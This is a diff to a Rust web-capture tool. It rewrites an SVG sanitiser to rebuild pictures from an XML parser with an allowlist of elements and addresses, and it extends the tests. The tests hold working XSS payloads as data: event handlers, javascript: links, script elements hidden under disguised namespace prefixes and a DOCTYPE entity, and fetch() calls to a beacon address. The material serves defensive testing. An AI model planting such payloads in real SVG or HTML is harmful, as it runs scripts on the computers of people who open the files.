@@ -9,6 +9,8 @@
 //! pictures lose their scripts and event handlers, or are left out when that cannot be
 //! done safely.
 
+use crate::capture::css;
+
 /// What a saved file is.
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, PartialOrd, Ord)]
 pub enum Kind {
@@ -411,224 +413,306 @@ pub fn is_lottie(bytes: &[u8]) -> bool {
         && o.get("layers").is_some_and(serde_json::Value::is_array)
 }
 
-/// An SVG picture without what can run in it: `<script>` elements, `on…` attributes,
-/// `javascript:` addresses, `<foreignObject>` (which can hold HTML) and frames. Returns
-/// `None` when something that may still run is left, so the picture is not kept.
+/// The SVG namespace, the only one whose elements a cleaned picture keeps.
+const SVG_NS: &str = "http://www.w3.org/2000/svg";
+const XLINK_NS: &str = "http://www.w3.org/1999/xlink";
+const XML_NS: &str = "http://www.w3.org/XML/1998/namespace";
+/// Elements a cleaned picture keeps (SVG shapes, paint, filters, text, animation). Not
+/// kept: `script`, `foreignObject` (which can hold HTML), `metadata` and anything else.
+const SVG_ELEMENTS: &[&str] = &[
+    "a",
+    "animate",
+    "animateMotion",
+    "animateTransform",
+    "circle",
+    "clipPath",
+    "defs",
+    "desc",
+    "ellipse",
+    "feBlend",
+    "feColorMatrix",
+    "feComponentTransfer",
+    "feComposite",
+    "feConvolveMatrix",
+    "feDiffuseLighting",
+    "feDisplacementMap",
+    "feDistantLight",
+    "feDropShadow",
+    "feFlood",
+    "feFuncA",
+    "feFuncB",
+    "feFuncG",
+    "feFuncR",
+    "feGaussianBlur",
+    "feImage",
+    "feMerge",
+    "feMergeNode",
+    "feMorphology",
+    "feOffset",
+    "fePointLight",
+    "feSpecularLighting",
+    "feSpotLight",
+    "feTile",
+    "feTurbulence",
+    "filter",
+    "g",
+    "image",
+    "line",
+    "linearGradient",
+    "marker",
+    "mask",
+    "mpath",
+    "path",
+    "pattern",
+    "polygon",
+    "polyline",
+    "radialGradient",
+    "rect",
+    "set",
+    "stop",
+    "style",
+    "svg",
+    "switch",
+    "symbol",
+    "text",
+    "textPath",
+    "title",
+    "tspan",
+    "use",
+    "view",
+];
+/// Nesting deeper than this is not a picture anyone drew; it is left out.
+const MAX_SVG_DEPTH: usize = 256;
+
+/// An SVG picture rebuilt from what an XML parser read of it, keeping only SVG elements
+/// from a fixed list (by namespace and name, so a prefix cannot disguise a `script`),
+/// without event handlers and with addresses limited to fragments (`#id`) and `data:`
+/// pictures (PNG, JPEG, GIF, WebP); CSS in it goes through [`css::confine`]. Comments,
+/// processing instructions (`xml-stylesheet`) and the XML declaration are dropped.
+/// `None` (the picture is left out) for anything that is not a well-formed SVG document,
+/// and for any document type declaration (an entity defined there could hold markup).
 ///
 /// Used through `<img>` or CSS, an SVG never runs scripts; this is for someone opening the
-/// saved file by itself in a browser.
+/// saved file by itself, and for the shapes copied into `index.html`.
+///
+/// [`css::confine`]: crate::capture::css::confine
 pub fn neutralise_svg(text: &str) -> Option<String> {
+    use quick_xml::events::Event;
+    use quick_xml::name::ResolveResult;
+
+    let mut reader = quick_xml::NsReader::from_str(text);
+    reader.config_mut().check_end_names = true;
     let mut out = String::with_capacity(text.len());
-    let lower = text.to_ascii_lowercase();
-    let bytes = text.as_bytes();
-    let mut i = 0;
-    while i < bytes.len() {
-        if bytes[i] != b'<' {
-            // Copy one whole character.
-            let ch_len = utf8_len(bytes[i]);
-            out.push_str(&text[i..(i + ch_len).min(text.len())]);
-            i += ch_len;
-            continue;
-        }
-        // Comments, CDATA and declarations are copied as they are (they cannot run).
-        if lower[i..].starts_with("<!--") {
-            let end = lower[i..]
-                .find("-->")
-                .map(|e| i + e + 3)
-                .unwrap_or(bytes.len());
-            out.push_str(&text[i..end]);
-            i = end;
-            continue;
-        }
-        let rest = &lower[i..];
-        let name: String = rest[1..]
-            .chars()
-            .take_while(|c| c.is_ascii_alphanumeric() || *c == ':' || *c == '-' || *c == '/')
-            .collect();
-        let bare = name.trim_start_matches('/');
-        let bare = bare.rsplit(':').next().unwrap_or(bare);
-        if matches!(
-            bare,
-            "script" | "foreignobject" | "iframe" | "embed" | "object" | "handler" | "listener"
-        ) {
-            if name.starts_with('/') {
-                // A stray closing tag: drop it.
-                let end = lower[i..]
-                    .find('>')
-                    .map(|e| i + e + 1)
-                    .unwrap_or(bytes.len());
-                i = end;
-                continue;
-            }
-            // Drop the element and everything up to its end tag.
-            let tag_end = lower[i..]
-                .find('>')
-                .map(|e| i + e + 1)
-                .unwrap_or(bytes.len());
-            if text[i..tag_end].trim_end_matches('>').ends_with('/') {
-                i = tag_end;
-                continue;
-            }
-            let close = format!("</{name}");
-            let alt = format!("</svg:{bare}");
-            let end = lower[tag_end..]
-                .find(&close)
-                .or_else(|| lower[tag_end..].find(&alt))
-                .map(|e| {
-                    let at = tag_end + e;
-                    lower[at..]
-                        .find('>')
-                        .map(|g| at + g + 1)
-                        .unwrap_or(bytes.len())
-                })
-                .unwrap_or(bytes.len());
-            i = end;
-            continue;
-        }
-        // An ordinary tag: copy it without event handlers and script addresses.
-        let tag_end = find_tag_end(text, i).unwrap_or(bytes.len());
-        out.push_str(&clean_tag(&text[i..tag_end]));
-        i = tag_end;
-    }
-    let check = out.to_ascii_lowercase();
-    let squeezed: String = check.chars().filter(|c| !c.is_whitespace()).collect();
-    let risky = squeezed.contains("<script")
-        || squeezed.contains("javascript:")
-        || squeezed.contains("vbscript:")
-        || squeezed.contains("<foreignobject")
-        || has_event_attribute(&check)
-        || check.contains("&#") && (squeezed.contains("href=") || squeezed.contains("values="));
-    (!risky).then_some(out)
-}
-
-fn utf8_len(first: u8) -> usize {
-    match first {
-        0x00..=0x7F => 1,
-        0xC0..=0xDF => 2,
-        0xE0..=0xEF => 3,
-        _ => 4,
-    }
-}
-
-/// The end of the tag starting at `start` (just past its `>`), skipping quoted values.
-fn find_tag_end(text: &str, start: usize) -> Option<usize> {
-    let bytes = text.as_bytes();
-    let mut quote: Option<u8> = None;
-    let mut i = start + 1;
-    while i < bytes.len() {
-        let b = bytes[i];
-        match quote {
-            Some(q) if b == q => quote = None,
-            Some(_) => {}
-            None if b == b'"' || b == b'\'' => quote = Some(b),
-            None if b == b'>' => return Some(i + 1),
-            None => {}
-        }
-        i += 1;
-    }
-    None
-}
-
-/// A tag without `on…` attributes and without attributes whose value is a script address.
-fn clean_tag(tag: &str) -> String {
-    // Split into the name and the attribute run.
-    let inner = tag.trim_start_matches('<');
-    let closing = inner.starts_with('/') || inner.starts_with('!') || inner.starts_with('?');
-    if closing {
-        return tag.to_string();
-    }
-    let name_end = inner
-        .find(|c: char| c.is_whitespace() || c == '>' || c == '/')
-        .unwrap_or(inner.len());
-    let name = &inner[..name_end];
-    let mut rest = &inner[name_end..];
-    let mut out = format!("<{name}");
+    // Open elements: whether each was kept.
+    let mut open: Vec<bool> = Vec::new();
+    // Inside a dropped element: how deep.
+    let mut skipping = 0usize;
+    let mut roots = 0usize;
+    // Text of the `<style>` element being read, written once it ends.
+    let mut style: Option<String> = None;
     loop {
-        let trimmed = rest.trim_start();
-        let ws = &rest[..rest.len() - trimmed.len()];
-        rest = trimmed;
-        if rest.is_empty() || rest.starts_with('>') || rest.starts_with("/>") {
-            out.push_str(rest);
-            break;
-        }
-        let an_end = rest
-            .find(|c: char| c.is_whitespace() || c == '=' || c == '>' || c == '/')
-            .unwrap_or(rest.len())
-            .max(1);
-        let attr_name = &rest[..an_end];
-        let mut after = &rest[an_end..];
-        let mut value = "";
-        let mut raw_value = "";
-        let t = after.trim_start();
-        if let Some(v) = t.strip_prefix('=') {
-            let v = v.trim_start();
-            let (val, consumed) = match v.as_bytes().first() {
-                Some(&q) if q == b'"' || q == b'\'' => match v[1..].find(q as char) {
-                    Some(e) => (&v[1..1 + e], 2 + e),
-                    None => (&v[1..], v.len()),
+        let (ns, event) = match reader.read_resolved_event() {
+            Ok((ns, e)) => (
+                match ns {
+                    ResolveResult::Bound(n) => Some(n.as_ref() == SVG_NS),
+                    ResolveResult::Unbound => Some(true),
+                    // A prefix nobody declared: not well-formed.
+                    ResolveResult::Unknown(_) => None,
                 },
-                _ => {
-                    let e = v
-                        .find(|c: char| c.is_whitespace() || c == '>')
-                        .unwrap_or(v.len());
-                    (&v[..e], e)
+                e,
+            ),
+            Err(_) => return None,
+        };
+        match event {
+            Event::Start(ref e) | Event::Empty(ref e) => {
+                let empty = matches!(event, Event::Empty(_));
+                let is_svg = ns?;
+                if skipping > 0 {
+                    if !empty {
+                        skipping += 1;
+                    }
+                    continue;
                 }
-            };
-            value = val;
-            let start_offset = after.len() - v.len();
-            raw_value = &after[..start_offset + consumed];
-            after = &after[start_offset + consumed..];
+                if open.is_empty() {
+                    roots += 1;
+                    if roots > 1 {
+                        return None;
+                    }
+                }
+                let local = e.local_name().into_inner().to_string();
+                if open.is_empty() && !(is_svg && local == "svg") {
+                    return None;
+                }
+                if open.len() >= MAX_SVG_DEPTH {
+                    return None;
+                }
+                let mut attrs: Vec<(String, String)> = Vec::new();
+                let mut target = String::new();
+                for a in e.attributes() {
+                    let a = a.ok()?;
+                    if a.key.as_namespace_binding().is_some() {
+                        continue;
+                    }
+                    let (ans, alocal) = reader.resolver().resolve_attribute(a.key);
+                    let alocal = alocal.into_inner().to_string();
+                    let value = a.normalized_value(quick_xml::XmlVersion::Implicit1_0).ok()?;
+                    let name = match ans {
+                        ResolveResult::Unbound => alocal.clone(),
+                        ResolveResult::Bound(n) if n.as_ref() == XLINK_NS => format!("xlink:{alocal}"),
+                        ResolveResult::Bound(n) if n.as_ref() == XML_NS => format!("xml:{alocal}"),
+                        ResolveResult::Bound(_) => continue,
+                        ResolveResult::Unknown(_) => return None,
+                    };
+                    if alocal == "attributeName" && !name.contains(':') {
+                        target = value.trim().to_ascii_lowercase();
+                    }
+                    if let Some(v) = svg_attribute(&name, &value) {
+                        attrs.push((name, v));
+                    }
+                }
+                let target = target.rsplit(':').next().unwrap_or("");
+                let animation = matches!(local.as_str(), "animate" | "set" | "animateMotion" | "animateTransform");
+                let kept = is_svg
+                    && SVG_ELEMENTS.contains(&local.as_str())
+                    && !(animation && (target == "href" || target.starts_with("on")));
+                if !kept {
+                    if !empty {
+                        skipping = 1;
+                    }
+                    continue;
+                }
+                out.push('<');
+                out.push_str(&local);
+                if open.is_empty() {
+                    out.push_str(" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"");
+                }
+                for (name, v) in &attrs {
+                    out.push(' ');
+                    out.push_str(name);
+                    out.push_str("=\"");
+                    out.push_str(&xml_escape(v, true));
+                    out.push('"');
+                }
+                if empty {
+                    out.push_str("/>");
+                } else {
+                    out.push('>');
+                    open.push(true);
+                    if local == "style" {
+                        style = Some(String::new());
+                    }
+                }
+            }
+            Event::End(ref e) => {
+                if skipping > 0 {
+                    skipping -= 1;
+                    continue;
+                }
+                if open.pop().is_none() {
+                    return None;
+                }
+                let local = e.local_name().into_inner().to_string();
+                if local == "style"
+                    && let Some(css_text) = style.take()
+                {
+                    let clean = css::confine(&css_text, |_| false)?;
+                    out.push_str(&xml_escape(&clean, false));
+                }
+                out.push_str("</");
+                out.push_str(&local);
+                out.push('>');
+            }
+            Event::Text(ref t) => {
+                let content = t.xml10_content();
+                if open.is_empty() {
+                    if !content.trim().is_empty() {
+                        return None;
+                    }
+                    continue;
+                }
+                if skipping == 0 {
+                    push_text(&mut out, &mut style, &content);
+                }
+            }
+            Event::CData(ref t) => {
+                if open.is_empty() {
+                    return None;
+                }
+                if skipping == 0 {
+                    let content = t.xml10_content().to_string();
+                    push_text(&mut out, &mut style, &content);
+                }
+            }
+            Event::GeneralRef(ref r) => {
+                let ch: String = if r.is_char_ref() {
+                    r.resolve_char_ref().ok()??.to_string()
+                } else {
+                    quick_xml::escape::resolve_predefined_entity(r.as_ref())?.to_string()
+                };
+                if open.is_empty() {
+                    return None;
+                }
+                if skipping == 0 {
+                    push_text(&mut out, &mut style, &ch);
+                }
+            }
+            // An entity defined in a document type could hold markup: not kept at all.
+            Event::DocType(_) => return None,
+            Event::Comment(_) | Event::PI(_) | Event::Decl(_) => {}
+            Event::Eof => break,
         }
-        let lname = attr_name.to_ascii_lowercase();
-        let squeezed: String = value
-            .chars()
-            .filter(|c| !c.is_whitespace() && !c.is_control())
-            .collect::<String>()
-            .to_ascii_lowercase();
-        let drop = lname.starts_with("on")
-            || squeezed.starts_with("javascript:")
-            || squeezed.starts_with("vbscript:")
-            || squeezed.starts_with("data:text/html");
-        if !drop {
-            out.push_str(ws);
-            out.push_str(attr_name);
-            out.push_str(raw_value);
+    }
+    (roots == 1 && open.is_empty() && skipping == 0).then_some(out)
+}
+
+/// Text of a kept element: escaped, or kept for the `<style>` being read.
+fn push_text(out: &mut String, style: &mut Option<String>, text: &str) {
+    match style {
+        Some(css_text) => css_text.push_str(text),
+        None => out.push_str(&xml_escape(text, false)),
+    }
+}
+
+/// The value an attribute of a cleaned SVG keeps, or `None` when it goes.
+fn svg_attribute(name: &str, value: &str) -> Option<String> {
+    let lname = name.to_ascii_lowercase();
+    if lname.starts_with("on") || lname == "xml:base" {
+        return None;
+    }
+    if !name.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | ':')) {
+        return None;
+    }
+    if name == "href" || name == "xlink:href" {
+        let t = css::url_text(value);
+        let lower = t.to_ascii_lowercase();
+        let picture = ["data:image/png", "data:image/jpeg", "data:image/gif", "data:image/webp"]
+            .iter()
+            .any(|p| lower.starts_with(p) && lower[p.len()..].starts_with([';', ',']));
+        return (t.starts_with('#') || picture).then_some(t);
+    }
+    let value = if name == "style" || value.contains('(') {
+        css::confine(value, |_| false)?
+    } else {
+        value.to_string()
+    };
+    (!crate::capture::inert::leaves_folder(&value)).then_some(value)
+}
+
+/// Text safe in XML (and in HTML, where the shapes are copied in): `&`, `<`, `>` and, in
+/// attributes, `"` written as references.
+fn xml_escape(s: &str, attribute: bool) -> String {
+    let mut out = String::with_capacity(s.len());
+    for c in s.chars() {
+        match c {
+            '&' => out.push_str("&amp;"),
+            '<' => out.push_str("&lt;"),
+            '>' => out.push_str("&gt;"),
+            '"' if attribute => out.push_str("&quot;"),
+            c if c.is_control() && !matches!(c, '\n' | '\t' | '\r') => {}
+            c => out.push(c),
         }
-        rest = after;
     }
     out
-}
-
-fn has_event_attribute(lower: &str) -> bool {
-    // ` on…=` inside a tag, after any whitespace or quote.
-    let bytes = lower.as_bytes();
-    let mut i = 0;
-    let mut in_tag = false;
-    while i + 3 < bytes.len() {
-        match bytes[i] {
-            b'<' => in_tag = true,
-            b'>' => in_tag = false,
-            c if in_tag
-                && (c.is_ascii_whitespace() || c == b'"' || c == b'\'' || c == b'/')
-                && bytes[i + 1] == b'o'
-                && bytes[i + 2] == b'n' =>
-            {
-                let mut j = i + 3;
-                while j < bytes.len() && bytes[j].is_ascii_alphanumeric() {
-                    j += 1;
-                }
-                while j < bytes.len() && bytes[j].is_ascii_whitespace() {
-                    j += 1;
-                }
-                if j > i + 3 && j < bytes.len() && bytes[j] == b'=' {
-                    return true;
-                }
-            }
-            _ => {}
-        }
-        i += 1;
-    }
-    false
 }
 
 #[cfg(test)]
@@ -753,33 +837,59 @@ mod tests {
 
     #[test]
     fn svg_pictures_lose_what_could_run() {
-        let svg = r##"<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><script>alert(2)</script><a href="javascript:alert(3)"><circle r="4" fill="#33f" onclick="x()"/></a><foreignObject><iframe src="https://evil"></iframe></foreignObject><text>ok</text></svg>"##;
+        let svg = r##"<?xml version="1.0"?><?xml-stylesheet href="https://evil.example/x.css"?><!-- c --><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" onload="alert(1)"><script>alert(2)</script><a href="javascript:alert(3)"><circle r="4" fill="#33f" onclick="x()"/></a><foreignObject><iframe src="https://evil"></iframe></foreignObject><text>ok &amp; &lt;b&gt;</text><use xlink:href="#dot"/><image href="data:image/png;base64,AAAA"/><image href="https://evil.example/i.png"/><rect style="fill:url(#g);background:url(//evil.example/b.png)" filter="url(file://evil.example/f.svg#f)"/><style><![CDATA[ .a > .b { fill: url(https://evil.example/p.svg#p) } ]]></style><animate attributeName="href" values="javascript:alert(4)"/><set attributeName="xlink:href" to="javascript:alert(5)"/><animate attributeName="opacity" values="0;1"/></svg>"##;
         let clean = neutralise_svg(svg).expect("kept");
         let lower = clean.to_ascii_lowercase();
-        assert!(!lower.contains("script"), "{clean}");
-        assert!(
-            !lower.contains("onload") && !lower.contains("onclick"),
-            "{clean}"
-        );
-        assert!(!lower.contains("javascript"), "{clean}");
-        assert!(
-            !lower.contains("iframe") && !lower.contains("foreignobject"),
-            "{clean}"
-        );
-        assert!(clean.contains("<circle r=\"4\" fill=\"#33f\"/>"), "{clean}");
-        assert!(clean.contains("<text>ok</text>"), "{clean}");
-        // A plain icon is unchanged.
+        for gone in ["script", "onload", "onclick", "javascript", "iframe", "foreignobject", "evil", "<!--", "<?"] {
+            assert!(!lower.contains(gone), "{gone}: {clean}");
+        }
+        assert!(clean.starts_with("<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">"), "{clean}");
+        assert!(clean.contains("<a><circle r=\"4\" fill=\"#33f\"/></a>"), "{clean}");
+        assert!(clean.contains("<text>ok &amp; &lt;b&gt;</text>"), "{clean}");
+        assert!(clean.contains("<use xlink:href=\"#dot\"/>"), "{clean}");
+        assert!(clean.contains("<image href=\"data:image/png;base64,AAAA\"/><image/>"), "{clean}");
+        assert!(clean.contains("<style> .a &gt; .b { fill: url(\"about:invalid\") } </style>"), "{clean}");
+        assert!(clean.contains("<animate attributeName=\"opacity\" values=\"0;1\"/></svg>"), "{clean}");
+        // Cleaning the clean picture changes nothing.
+        assert_eq!(neutralise_svg(&clean).as_deref(), Some(clean.as_str()));
+        // A plain icon keeps its shapes; one without a namespace gets the SVG one.
         let icon = r#"<svg viewBox="0 0 10 10"><path d="M0 0h10v10z"/></svg>"#;
-        assert_eq!(neutralise_svg(icon).as_deref(), Some(icon));
-        // Encoded tricks are not guessed at: the picture is left out.
-        assert!(neutralise_svg(r#"<svg><a href="&#106;avascript:alert(1)">x</a></svg>"#).is_none());
-        assert!(
-            neutralise_svg(r#"<svg><SCRIPT>alert(1)</SCRIPT></svg>"#)
-                .is_some_and(|s| !s.to_ascii_lowercase().contains("script"))
+        assert_eq!(
+            neutralise_svg(icon).as_deref(),
+            Some("<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" viewBox=\"0 0 10 10\"><path d=\"M0 0h10v10z\"/></svg>")
         );
-        assert!(
-            neutralise_svg(r#"<svg><svg:script>alert(1)</svg:script></svg>"#)
-                .is_some_and(|s| !s.contains("alert"))
-        );
+        // An encoded address is read as the browser reads it, and goes.
+        let enc = neutralise_svg(r#"<svg xmlns="http://www.w3.org/2000/svg"><a href="&#106;avascript:alert(1)">x</a></svg>"#).unwrap();
+        assert!(!enc.contains("href"), "{enc}");
+        assert!(neutralise_svg(r#"<svg><SCRIPT>alert(1)</SCRIPT></svg>"#).is_some_and(|s| !s.contains("alert")));
+        // A prefix nobody declared, broken XML and not-an-SVG are left out.
+        for bad in [
+            r#"<svg><svg:script>alert(1)</svg:script></svg>"#,
+            r#"<svg xmlns="http://www.w3.org/2000/svg"><g></svg>"#,
+            r#"<html xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></html>"#,
+            r#"<svg xmlns="http://www.w3.org/2000/svg"/><svg xmlns="http://www.w3.org/2000/svg"/>"#,
+            r#"text<svg xmlns="http://www.w3.org/2000/svg"/>"#,
+            r#"<svg xmlns="http://www.w3.org/2000/svg">&nbsp;</svg>"#,
+        ] {
+            assert!(neutralise_svg(bad).is_none(), "{bad}");
+        }
+    }
+
+    /// The pictures of the independent review (runs/C): each ran script when opened.
+    #[test]
+    fn disguised_scripts_in_svg_pictures_are_gone() {
+        let pub_ = "http://93.184.215.14:8080";
+        let c1 = format!("<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"20\" height=\"20\"><rect width=\"20\" height=\"20\" fill=\"green\"/><_:script xmlns:_=\"http://www.w3.org/2000/svg\">document.documentElement.setAttribute(\"data-pwned\",\"C1\");fetch(\"{pub_}/BEACON-C1\")</_:script></svg>");
+        let c2 = format!("<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"20\" height=\"20\"><rect width=\"20\" height=\"20\" fill=\"blue\"/><h.x:script xmlns:h.x=\"http://www.w3.org/1999/xhtml\">document.documentElement.setAttribute(\"data-pwned\",\"C2\");fetch(\"{pub_}/BEACON-C2\")</h.x:script></svg>");
+        let c3 = format!("<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY x \"&#60;script&#62;document.documentElement.setAttribute(&#34;data-pwned&#34;,&#34;C3&#34;);fetch(&#34;{pub_}/BEACON-C3&#34;)&#60;/script&#62;\">]><svg xmlns=\"http://www.w3.org/2000/svg\" width=\"20\" height=\"20\"><rect width=\"20\" height=\"20\" fill=\"orange\"/>&x;</svg>");
+        let c4 = "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"20\" height=\"20\" x=\">\" onload=\"document.documentElement.setAttribute('data-pwned','C4')\"><rect width=\"20\" height=\"20\"/></svg>".to_string();
+        for (name, svg) in [("C1", &c1), ("C2", &c2), ("C4", &c4)] {
+            let clean = neutralise_svg(svg).unwrap_or_else(|| panic!("{name} keeps its picture"));
+            for gone in ["script", "pwned", "BEACON", "onload"] {
+                assert!(!clean.contains(gone), "{name}: {gone} in {clean}");
+            }
+            assert!(clean.contains("<rect width=\"20\" height=\"20\""), "{name}: {clean}");
+        }
+        assert!(neutralise_svg(&c3).is_none(), "a document type is never kept");
     }
 }
